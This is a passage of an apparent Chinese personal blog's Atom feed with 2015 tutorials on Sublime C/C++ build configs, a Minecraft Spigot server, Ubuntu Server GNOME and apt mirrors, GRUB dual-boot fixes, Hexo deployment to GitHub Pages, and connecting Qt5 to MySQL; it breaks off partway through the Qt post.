    <link href="http://xzjqx.data/2015/12/27/sublime-cfile/"/>
    <id>http://xzjqx.data/2015/12/27/sublime-cfile/</id>
    <published>2015-12-26T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.579Z</updated>
    
    <content type="html"><![CDATA[<!--
Title: 使用Sublime直接编译运行C/C++源文件
Date: 2015年12月27日
-->
<p>以前只知道Sublime是一个有个性的编辑器，最近才发现原来不仅仅是有个性的编译器。<br>今天就讲讲怎么直接在Sublime上编译执行C/C++源程序<br><a id="more"></a></p>
<h2 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a><strong>C语言</strong></h2><p>在菜单栏点击Tools-&gt;Build System-&gt;New Build System会打开一个名为<strong>untitled.sublime-build</strong>的文件，将下段代码复制进该文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;working_dir&quot;: &quot;$file_path&quot;,</div><div class="line">    &quot;cmd&quot;: &quot;gcc -Wall $file_name -o $file_base_name&quot;,</div><div class="line">    &quot;file_regex&quot;: &quot;^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$&quot;,</div><div class="line">    &quot;selector&quot;: &quot;source.c&quot;,</div><div class="line"></div><div class="line">    &quot;variants&quot;:</div><div class="line">    [</div><div class="line">        &#123;   </div><div class="line">        &quot;name&quot;: &quot;Run&quot;,</div><div class="line">            &quot;shell_cmd&quot;: &quot;gcc -Wall $file -o $file_base_name &amp;&amp; start cmd /c \&quot;$&#123;file_path&#125;/$&#123;file_base_name&#125; &amp; pause\&quot;&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>然后按<code>Ctrl+S</code>保存，打开一个User文件夹，说明保存为用户设置，可以修改名称为<strong>c.sublime-build</strong><br>最后在Tools-&gt;Build Sysrem下选择c选项即可</p>
<p><strong>使用</strong><br>打开一个c源文件，按下组合键<code>Ctrl+B</code>，第一次会弹出一个复选框，其中有<code>c</code>或<code>c - run</code>两项，点击第一项为编译，第二项为编译执行</p>
<p><strong>注意</strong><br>组合键<code>Ctrl+B</code>为打开上一次选择的编译选项<br>组合键<code>Ctrl+Shift+B</code>为打开选择框，可选两种编译选项</p>
<h2 id="C"><a href="#C" class="headerlink" title="C++"></a><strong>C++</strong></h2><p>c++的配置与上述一致，只需将代码修改如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;encoding&quot;: &quot;utf-8&quot;,</div><div class="line">    &quot;working_dir&quot;: &quot;$file_path&quot;,</div><div class="line">    &quot;shell_cmd&quot;: &quot;g++ -Wall -std=c++0x $file_name -o $file_base_name&quot;,</div><div class="line">    &quot;file_regex&quot;: &quot;^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$&quot;,</div><div class="line">    &quot;selector&quot;: &quot;source.c++&quot;,</div><div class="line"></div><div class="line">    &quot;variants&quot;:</div><div class="line">    [</div><div class="line">        &#123;   </div><div class="line">        &quot;name&quot;: &quot;Run&quot;,</div><div class="line">            &quot;shell_cmd&quot;: &quot;g++ -Wall -std=c++0x $file -o $file_base_name &amp;&amp; start cmd /c \&quot;$&#123;file_path&#125;/$&#123;file_base_name&#125; &amp; pause\&quot;&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>再将名字改为c++.sublime-build即可</p>]]></content>
    
    <summary type="html">
    
      &lt;!--
Title: 使用Sublime直接编译运行C/C++源文件
Date: 2015年12月27日
--&gt;
&lt;p&gt;以前只知道Sublime是一个有个性的编辑器，最近才发现原来不仅仅是有个性的编译器。&lt;br&gt;今天就讲讲怎么直接在Sublime上编译执行C/C++源程序&lt;br&gt;
    
    </summary>
    
      <category term="技术博文" scheme="http://xzjqx.data/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/"/>
    
    
      <category term="C/C++" scheme="http://xzjqx.data/tags/C-C/"/>
    
      <category term="Sublime" scheme="http://xzjqx.data/tags/Sublime/"/>
    
  </entry>
  
  <entry>
    <title>搭建MineCraft私服</title>
    <link href="http://xzjqx.data/2015/12/23/Minecraft-server/"/>
    <id>http://xzjqx.data/2015/12/23/Minecraft-server/</id>
    <published>2015-12-22T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.568Z</updated>
    
    <content type="html"><![CDATA[<!--
Title: 搭建MineCraft私服
Date: 2015年12月23日
-->
<p>最近购买了腾讯云的云主机，因为腾讯云最近在办活动——<a href="http://bbs.qcloud.com/thread-9953-1-1.html" target="_blank" rel="external">校园云+计划</a>，所以我只花了1软妹币/月就购进了一台CPU1核、内存1G、带宽1M、系统盘linux8G的云主机了，这无疑是给我们学生大大的福利啊（这个安利可以忽视）</p>
<p>拿到云主机后我首先做的就是<a href="http://xzjqx.cn/build-wordpress/" target="_blank" rel="external">搭建WordPress博客系统</a>，之后才想到搭建一个MineCraft的私人服务器，这样就可以几个小伙伴一起在自己的服务器上愉快的玩耍了。</p>
<p>由于我的服务器上已经有一个WordPress博客系统了，我担心云主机内存不够，所以就在室友买的另一个没用过的服务器上搭建MineCraft私服了。<br><a id="more"></a><br>闲话聊完，接下来就是重点了</p>
<h2 id="搭建过程简单分为以下几步"><a href="#搭建过程简单分为以下几步" class="headerlink" title="搭建过程简单分为以下几步"></a>搭建过程简单分为以下几步</h2><ul>
<li>安装JAVA环境</li>
<li>MineCraft服务器安装</li>
<li>MineCraft服务器配置</li>
<li>MineCraft客户端连接</li>
</ul>
<h3 id="安装JAVA环境"><a href="#安装JAVA环境" class="headerlink" title="安装JAVA环境"></a><strong>安装JAVA环境</strong></h3><p>直接使用命令安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install java</div></pre></td></tr></table></figure></p>
<p>安装完成，使用<strong>java -version</strong>查看java版本</p>
<h3 id="MineCraft服务器安装"><a href="#MineCraft服务器安装" class="headerlink" title="MineCraft服务器安装"></a><strong>MineCraft服务器安装</strong></h3><p>在<a href="http://pan.baidu.com/s/1jGVXBMm" target="_blank" rel="external">我的网盘</a>上下载<strong>Spigot</strong><br>密码：d8g2<br>将下载下来的文件上传到服务器的一个新建目录下，比如<strong>~/minecraft/</strong><br>使用下列命令启动<strong>Spigot</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar -Xmx512m -Xms512m -XX:MaxPermSize=256M -Dfile.encoding=utf-8 -Duser.timezone=Asia/Hong_Kong ~/minecraft/spigot.jar</div></pre></td></tr></table></figure></p>
<p>第一次启动时会自动生成一些配置文件，且会因为一个简单的原因自动关闭服务，这时只需修改生成的<strong>eula.txt</strong>文件，将其中的<strong>eula=false</strong>改为<strong>eula=true</strong>，然后重新启动服务即可。</p>
<h3 id="MineCraft服务器配置"><a href="#MineCraft服务器配置" class="headerlink" title="MineCraft服务器配置"></a><strong>MineCraft服务器配置</strong></h3><p>打开~/minecraft/目录下的配置文件<strong>server.properties</strong>，将其中的<strong>online-mode=true</strong>改为<strong>online-mode=false</strong>即可</p>
<h3 id="MineCraft客户端连接"><a href="#MineCraft客户端连接" class="headerlink" title="MineCraft客户端连接"></a><strong>MineCraft客户端连接</strong></h3><p>在网上下载同版本的MinCraft客户端，打开后进入多人游戏，选择直接连接，填上自己的主机IP即可连上游戏开始愉快的玩耍了。</p>]]></content>
    
    <summary type="html">
    
      &lt;!--
Title: 搭建MineCraft私服
Date: 2015年12月23日
--&gt;
&lt;p&gt;最近购买了腾讯云的云主机，因为腾讯云最近在办活动——&lt;a href=&quot;http://bbs.qcloud.com/thread-9953-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;校园云+计划&lt;/a&gt;，所以我只花了1软妹币/月就购进了一台CPU1核、内存1G、带宽1M、系统盘linux8G的云主机了，这无疑是给我们学生大大的福利啊（这个安利可以忽视）&lt;/p&gt;
&lt;p&gt;拿到云主机后我首先做的就是&lt;a href=&quot;http://xzjqx.cn/build-wordpress/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;搭建WordPress博客系统&lt;/a&gt;，之后才想到搭建一个MineCraft的私人服务器，这样就可以几个小伙伴一起在自己的服务器上愉快的玩耍了。&lt;/p&gt;
&lt;p&gt;由于我的服务器上已经有一个WordPress博客系统了，我担心云主机内存不够，所以就在室友买的另一个没用过的服务器上搭建MineCraft私服了。&lt;br&gt;
    
    </summary>
    
      <category term="技术博文" scheme="http://xzjqx.data/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/"/>
    
    
      <category term="MineCraft" scheme="http://xzjqx.data/tags/MineCraft/"/>
    
      <category term="云服务器" scheme="http://xzjqx.data/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu Server 安装gnome桌面</title>
    <link href="http://xzjqx.data/2015/12/15/ubuntu-server-desktop/"/>
    <id>http://xzjqx.data/2015/12/15/ubuntu-server-desktop/</id>
    <published>2015-12-14T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.580Z</updated>
    
    <content type="html"><![CDATA[<!--
Title: Ubuntu Server 安装gnome桌面
Date: 2015年12月15日
-->
<p>上一篇博文提到修改<strong>Ubuntu Server</strong>的源列表到国内服务器中，接下来可以安装gnome桌面来试试</p>
<a id="more"></a>
<p>首先展示几张<strong>ubuntu-gnome-desktop</strong>的图片<br><img src="http://7xo385.com1.z0.glb.clouddn.com/gnome_sock.png" alt="gnome-sock"><br><!-- more --><br><img src="http://7xo385.com1.z0.glb.clouddn.com/gnome_login.png" alt="gnome-login"><br><img src="http://7xo385.com1.z0.glb.clouddn.com/gnome_desktop.png" alt="gnome-desktop"></p>
<p>为防止安装失败首先更新系统软件列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div></pre></td></tr></table></figure></p>
<p>执行下列命令安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install gnome-core</div><div class="line">sudo apt-get install ubuntu-gnome-desktop</div></pre></td></tr></table></figure></p>
<p>我第一次没有安装<strong>gnome-core</strong>导致，导致多次安装失败，结果还重装了几次系统<del datetime="2015-12-15T09:17:14+00:00">还好是虚拟机</del></p>]]></content>
    
    <summary type="html">
    
      &lt;!--
Title: Ubuntu Server 安装gnome桌面
Date: 2015年12月15日
--&gt;
&lt;p&gt;上一篇博文提到修改&lt;strong&gt;Ubuntu Server&lt;/strong&gt;的源列表到国内服务器中，接下来可以安装gnome桌面来试试&lt;/p&gt;
    
    </summary>
    
      <category term="技术博文" scheme="http://xzjqx.data/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/"/>
    
    
      <category term="ubuntu-server" scheme="http://xzjqx.data/tags/ubuntu-server/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu Server 更新源列表</title>
    <link href="http://xzjqx.data/2015/12/15/ubuntu-server-update-list/"/>
    <id>http://xzjqx.data/2015/12/15/ubuntu-server-update-list/</id>
    <published>2015-12-14T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.580Z</updated>
    
    <content type="html"><![CDATA[<!--
Title: Ubuntu Server 更新源列表
Date: 2015年12月15日
-->
<p>在<strong>Ubuntu Server</strong>下可以使用如下命令更新源列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo su #获取root权限</div><div class="line">cd /etc/apt</div><div class="line">cp source.list source.list.backup #备份源列表</div><div class="line">vim source.list #编辑源列表</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>在source.list文件中从开头加入下列代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">deb http://mirrors.ustc.edu.cn/ubuntu trusty multiverse restricted universe</div><div class="line">deb http://mirrors.ustc.edu.cn/ubuntu trusty-backports multiverse restricted universe</div><div class="line">deb http://mirrors.ustc.edu.cn/ubuntu trusty-proposed multiverse restricted universe</div><div class="line">deb http://mirrors.ustc.edu.cn/ubuntu trusty-security multiverse restricted universe</div><div class="line">deb http://mirrors.ustc.edu.cn/ubuntu trusty-updates multiverse restricted universe</div><div class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu trusty multiverse restricted universe</div><div class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu trusty-backports multiverse restricted universe</div><div class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu trusty-proposed multiverse restricted universe</div><div class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu trusty-security multiverse restricted universe</div><div class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu trusty-updates multiverse restricted universe</div></pre></td></tr></table></figure></p>
<p>之后使用下列代码更新即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line">apt-get upgrade -y</div></pre></td></tr></table></figure></p>
<p>注：使用vim更新源列表可能用到的复制粘贴命令</p>
<ul>
<li>y 复制</li>
<li>yy 复制整行</li>
<li>p(小写) 在当前光标后粘贴</li>
<li>P(大写) 在当前光标粘贴</li>
</ul>]]></content>
    
    <summary type="html">
    
      &lt;!--
Title: Ubuntu Server 更新源列表
Date: 2015年12月15日
--&gt;
&lt;p&gt;在&lt;strong&gt;Ubuntu Server&lt;/strong&gt;下可以使用如下命令更新源列表&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sudo su #获取root权限&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cd /etc/apt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cp source.list source.list.backup #备份源列表&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;vim source.list #编辑源列表&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="技术博文" scheme="http://xzjqx.data/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/"/>
    
    
      <category term="ubuntu-server" scheme="http://xzjqx.data/tags/ubuntu-server/"/>
    
  </entry>
  
  <entry>
    <title>调出grub并应用其引导Windows+Ubuntu启动</title>
    <link href="http://xzjqx.data/2015/11/25/open-grub/"/>
    <id>http://xzjqx.data/2015/11/25/open-grub/</id>
    <published>2015-11-24T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.578Z</updated>
    
    <content type="html"><![CDATA[<!--
Title: 调出grub并应用其引导Windows+Ubuntu启动
Date: 2015年11月25日
-->
<p>今天一个室友安装 <strong>Windows+Ubuntu</strong> 双系统，碰上一个小问题，现在记录下来。<br>其实只是一个很简单的问题，但是对于没有用过<strong>linux</strong>系统的少年可能很难，但是有那么句话嘛</p>
<blockquote>
<p>无折腾不少年</p>
</blockquote>
<p>所以只是需要我们多百度查找网上的教程就好了，自己折腾还会记忆深刻呢(^_^)|||<br><a id="more"></a></p>
<h2 id="唠完了，以下是正题"><a href="#唠完了，以下是正题" class="headerlink" title="唠完了，以下是正题"></a>唠完了，以下是正题</h2><p>问题是装完<strong>Ubuntu</strong>后重启直接进入了<strong>Ubuntu</strong>，而没有引导界面</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>首先打开终端输入以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo update-grub</div></pre></td></tr></table></figure></p>
<p>输入用户密码后看到以下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Generating grub configuration file ...</div><div class="line">Warning: Setting GRUB_TIMEOUT to a non-zero value when GRUB_HIDDEN_TIMEOUT is set is no longer supported.</div><div class="line">Found linux image: /boot/vmlinuz-3.16.0-23-generic</div><div class="line">Found initrd image: /boot/initrd.img-3.16.0-23-generic</div><div class="line">Found memtest86+ image: /boot/memtest86+.elf</div><div class="line">Found memtest86+ image: /boot/memtest86+.bin</div><div class="line">Found Windows 8 (loader) on /dev/sda1</div><div class="line">done</div></pre></td></tr></table></figure></p>
<p>发现可以找到windows，那为什么没有<strong>grub</strong>的引导呢<br>我们输入以下代码看看<strong>grub</strong>的默认配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo gedit /etc/defauit/grub</div></pre></td></tr></table></figure></p>
<p>我们发现<strong>GRUB_HIDDEN_TIMEOUT</strong>项的值为0<br>将<strong>GRUB_HIDDEN_TIMEOUT=0</strong>改为<strong>GRUB_HIDDEN_TIMEOUT=1</strong>试试</p>
<p>然后再<strong>sudo update-grub</strong>更新grub配置<br>最后<strong>sudo reboot</strong>重启系统。</p>
<p>结果是出现了<strong>grub</strong>引导且有windows项，问题就这么被我们解决了，想想真的挺简单的。</p>
<h2 id="再附上一个修改grub使windows为第一启动项的方法"><a href="#再附上一个修改grub使windows为第一启动项的方法" class="headerlink" title="再附上一个修改grub使windows为第一启动项的方法"></a>再附上一个修改grub使windows为第一启动项的方法</h2><p>输入<strong>sudo nautilus</strong>以管理员身份打开文件管理器，图形化界面进入<strong>/etc/grub.d</strong>目录，将文件<strong>30_os-prober</strong>的文件名中的<strong>30</strong>改为<strong>5~10中的一个（不包括5和10）</strong></p>
<p>然后再<strong>sudo update-grub</strong>更新grub配置<br>最后<strong>sudo reboot</strong>重启系统。</p>
<p>重启后<strong>Windows 8 (loader) on</strong>就在第一项了，默认进入的也是<strong>windows</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;!--
Title: 调出grub并应用其引导Windows+Ubuntu启动
Date: 2015年11月25日
--&gt;
&lt;p&gt;今天一个室友安装 &lt;strong&gt;Windows+Ubuntu&lt;/strong&gt; 双系统，碰上一个小问题，现在记录下来。&lt;br&gt;其实只是一个很简单的问题，但是对于没有用过&lt;strong&gt;linux&lt;/strong&gt;系统的少年可能很难，但是有那么句话嘛&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;无折腾不少年&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以只是需要我们多百度查找网上的教程就好了，自己折腾还会记忆深刻呢(^_^)|||&lt;br&gt;
    
    </summary>
    
      <category term="技术博文" scheme="http://xzjqx.data/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/"/>
    
    
      <category term="grub" scheme="http://xzjqx.data/tags/grub/"/>
    
      <category term="ubuntu" scheme="http://xzjqx.data/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>记录Hexo的搭建过程</title>
    <link href="http://xzjqx.data/2015/11/16/hexo-build/"/>
    <id>http://xzjqx.data/2015/11/16/hexo-build/</id>
    <published>2015-11-16T03:11:48.000Z</published>
    <updated>2018-04-13T02:40:48.873Z</updated>
    
    <content type="html"><![CDATA[<p>这是我第一次在自己搭建的博客上编写Markdown文章，现在心里还是有点小激动<br>经过几天的检索+实验+再检索+再实验，终于把这样的一个Hexo博客搭建好了，现在正是心情大好，是时候LOL一发了……额，别跑题==<br><a id="more"></a><br>好了，到正题了，以下是我的搭建实录：<br>我使用的是 Hexo+Github 部署的博客系统：</p>
<blockquote>
<p>GitHub is a Web-based Git repository hosting service. ——<a href="https://en.wikipedia.org/wiki/GitHub" target="_blank" rel="external">Wikipedia</a><br>Hexo is a fast, simple &amp; powerful blog framework, powered by Node.js. ——<a href="https://hexo.io/" target="_blank" rel="external">Hexo</a></p>
</blockquote>
<h1 id="Hexo的安装过程查看Hexo静态博客使用指南"><a href="#Hexo的安装过程查看Hexo静态博客使用指南" class="headerlink" title="Hexo的安装过程查看Hexo静态博客使用指南"></a>Hexo的安装过程查看<a href="http://www.tuicool.com/articles/Jva2iaA" target="_blank" rel="external">Hexo静态博客使用指南</a></h1><p>这是在 Mac or Linux 下的安装， Windows 的安装几乎一样，只是要你转到 git bash 下执行这些操作了（<del>熟悉使用</del>git就能很快上手）</p>
<h1 id="配置-Github-Pages"><a href="#配置-Github-Pages" class="headerlink" title="配置 Github Pages"></a>配置 Github Pages</h1><p>使用<a href="https://github.com/" target="_blank" rel="external">Github</a>之前需要注册账号，并添加 SSH key，请移步<a href="http://jingyan.baidu.com/article/a65957f4f0acc624e67f9bc1.html" target="_blank" rel="external">如何SHH key给GITHUB</a></p>
<h1 id="在-Github-添加仓库"><a href="#在-Github-添加仓库" class="headerlink" title="在 Github 添加仓库"></a>在 Github 添加仓库</h1><p>在 Github 中添加名为 yourname.github.io 的仓库，比如我的就是 xiao-jian.github.io 然后将形如 git@github.com:xzjqx/xzjqx.github.io.git 的SSH保存下来方便在 Hexo 中配置</p>
<h1 id="配置Hexo"><a href="#配置Hexo" class="headerlink" title="配置Hexo"></a>配置Hexo</h1><p>我把网站部署在了 Github 上，修改 Hexo 根目录下的_config.yml文件（在deploy下添加）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">deploy:</div><div class="line">  type: git</div><div class="line">  repository: git@github.com:Xiao-Jian/xiao-jian.github.io.git</div><div class="line">  branch: master</div></pre></td></tr></table></figure>
<p>然后使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hexo g #hexo generate</div><div class="line">hexo d #hexo deploy</div></pre></td></tr></table></figure>
<p>第一次部署发现提示错误信息：ERROR Deployer not found : git<br>需要先运行以下命令npm install hexo-deployer-git –save<br>再次部署即可成功。</p>
<p>当然还可以在部署之前使用hexo s #hexo serve在本地服务器提前查看效果——在浏览器中输入localhost:4000查看效果</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是我第一次在自己搭建的博客上编写Markdown文章，现在心里还是有点小激动&lt;br&gt;经过几天的检索+实验+再检索+再实验，终于把这样的一个Hexo博客搭建好了，现在正是心情大好，是时候LOL一发了……额，别跑题==&lt;br&gt;
    
    </summary>
    
      <category term="技术博文" scheme="http://xzjqx.data/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/"/>
    
    
      <category term="Hexo" scheme="http://xzjqx.data/tags/Hexo/"/>
    
      <category term="GitHub Pages" scheme="http://xzjqx.data/tags/GitHub-Pages/"/>
    
      <category term="Coding Pages" scheme="http://xzjqx.data/tags/Coding-Pages/"/>
    
  </entry>
  
  <entry>
    <title>软件实习笔记三（Qt5.5连接MySQL5.6）</title>
    <link href="http://xzjqx.data/2015/10/02/software-practice-3/"/>
    <id>http://xzjqx.data/2015/10/02/software-practice-3/</id>
    <published>2015-10-01T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.579Z</updated>
    
    <content type="html"><![CDATA[<p>这段时间一直在尝试使用Qt连接上MySQL数据库，真的是有点难啊！！！<br>参考了很多网上的资料，最后才成功的连上了数据库，文末将会有我认为有用的链接。<br>成功后发现其实也没有那么难嘛，只是自己真的是有点傻呢==</p>
<a id="more"></a>
<p>首先Qt5以后自带MySQL的驱动，不像现在网上那些Qt4的教程，需要我们自己重新编译加载MySQL的驱动，这样整个过程确实简单多了。。。<br>所以安装MySQL的过程就不赘述了。。。<br>接下来要介绍连接数据库的各种错误：</p>
<h3 id="链接错误"><a href="#链接错误" class="headerlink" title="链接错误"></a>链接错误</h3><p>错误显示如下：<br><img src="http://img.blog.csdn.net/20151003003748400" alt=""></p>
<p>解决方法：由于在qt中使用了数据库，但是在它的项目文件中却没有相应的说明，所以在工程的.pro文件加入一句代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QT += sql</div></pre></td></tr></table></figure></p>
<h3 id="提示能找到MySQL数据库，但是不能加载数据库"><a href="#提示能找到MySQL数据库，但是不能加载数据库" class="headerlink" title="提示能找到MySQL数据库，但是不能加载数据库"></a>提示能找到MySQL数据库，但是不能加载数据库</h3><p>错误显示如下：<br><img src="http://img.blog.csdn.net/20151003005433524" alt=""></p>
<p>这个问题就比较复杂了，我们需要进行调试，调试过程如下：</p>
<ul>
<li>首先使用qDebug输出错误信息，在main函数中加入以下代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">qDebug() &lt;&lt; QSqlDatabase::drivers();  </div><div class="line">qDebug() &lt;&lt; QCoreApplication::libraryPaths();</div></pre></td></tr></table></figure>
</li>
</ul>
<p>应用程序输出显示如下错误信息：<br><img src="http://img.blog.csdn.net/20151003005757654" alt=""></p>
<p>发现我们输出的可使用数据库的驱动中存在“<strong>QMYSQL</strong>”，但是在连接时不能找到，这是为什么呢？我们接着向下看，发现在库依赖中的<code>D:/Qt/Qt5.5.0/5.5/mingw492_32/plugins</code>目录下存在sqldrivers目录，说明驱动存在，那原因到底是什么呢，再看后面提示的<br><code>D:/build-QtTest-Desktop_Qt_5_5_0_MinGW_32bit-Debug/debug</code>目录，该目录是程序输入目录，库依赖指到这，说明其中缺少了什么库嘛，那我们现在的目标是去找出缺少的库，加入在这个文件夹中应该就能解决问题了。</p>
<ul>
<li>我们将主函数的代码改成下述代码，再查看程序输出查找原因：<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qtsql/QSqlDatabase&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qtsql/QSqlQuery&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qtsql/QSqlError&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QPluginLoader&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span>  </span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMySqlDriver</span><span class="params">()</span></span>;  </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;  </div><div class="line">    <span class="function">QCoreApplication <span class="title">app</span><span class="params">(argc, argv)</span></span>;  </div><div class="line">    loadMySqlDriver();  </div><div class="line">    <span class="keyword">return</span> app.exec();  </div><div class="line">&#125;  </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMySqlDriver</span><span class="params">()</span> </span>&#123;  </div><div class="line">    QPluginLoader loader;  </div><div class="line">    <span class="comment">// MySQL 驱动插件的路径  </span></div><div class="line">    loader.setFileName(<span class="string">"D:/Qt/Qt5.5.0/5.5/mingw492_32/plugins/sqldrivers/qsqlmysqld.dll"</span>);  </div><div class="line">    qDebug() &lt;&lt; loader.load();  </div><div class="line">    qDebug() &lt;&lt; loader.errorString();  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>显示错误如下：<br><img src="http://img.blog.csdn.net/20151003011500167" alt=""></p>
<p>由此看来加载<strong>MySQL</strong>驱动出错不是找不到驱动插件<code>qsqlmysqld.dll</code>，而是找不到<code>qsqlmysqld.dll</code>依赖的<strong>DLL</strong>. 把<code>~/MySQL Server 5.6/lib</code>下的<br><code>libmysql.dll</code>和<code>libmysqld.dll</code>复制到<strong>exe</strong>文件所在目录(如下图)<br><img src="http://img.blog.csdn.net/20151003011923063" alt=""></p>
<ul>
<li><p>然后再运行程序，这时 MySQL 驱动插件就加载成功了，输出如下：<br><img src="http://img.blog.csdn.net/20151003012133782" alt=""></p>
</li>
<li><p>最后我们修改main函数查看能否连接数据库：</p>
